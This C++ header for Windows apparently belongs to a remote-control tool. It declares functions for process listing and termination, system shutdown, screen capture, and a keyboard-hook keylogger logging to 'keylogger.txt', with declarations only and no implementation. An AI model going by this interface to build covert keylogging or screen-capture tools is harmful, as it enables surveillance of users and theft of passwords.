#pragma once

#include <string>
#include <vector>
#include <unordered_set>
#include <windows.h>
#include <atomic>
#include <thread>
#include <mutex>

//#define STB_IMAGE_WRITE_IMPLEMENTATION
//#include "stb_image_write.h"

struct EnumWindowsCallbackData {
    std::unordered_set<DWORD>* pids_with_windows;
};

static BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam);

std::unordered_set<DWORD> get_pids_with_visible_windows();

bool EnableShutdownPrivilege();

std::string list_apps_windows();
std::string list_background_processes_windows();
std::string start_new_process_windows(const std::string& command_line);
std::string terminate_process_by_pid_windows(DWORD process_id);
std::string terminate_process_by_name_windows(const std::string& process_name);
std::string shutdown_windows_system();
std::string restart_windows_system();

// --- Keylogger Declarations ---
// Callback function for the keyboard hook
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

// Function for the keylogger thread
void KeyloggerThreadFunction();

// Functions to manage the keylogger
std::string start_keylogger();
std::string stop_keylogger();
// This version still has get_keylogs to read the file
std::string get_keylogs(const std::string& log_file_path = "keylogger.txt");


// Global variables to manage the keylogger thread and hook
extern std::atomic_bool g_keylogger_running;
extern std::thread g_keylogger_thread;
extern HHOOK g_keyboard_hook;
extern std::mutex g_log_mutex; // Mutex for file access (used in this version)
extern DWORD g_keylogger_thread_id; // Thread ID for PostThreadMessage


// capture screen
bool captureScreen();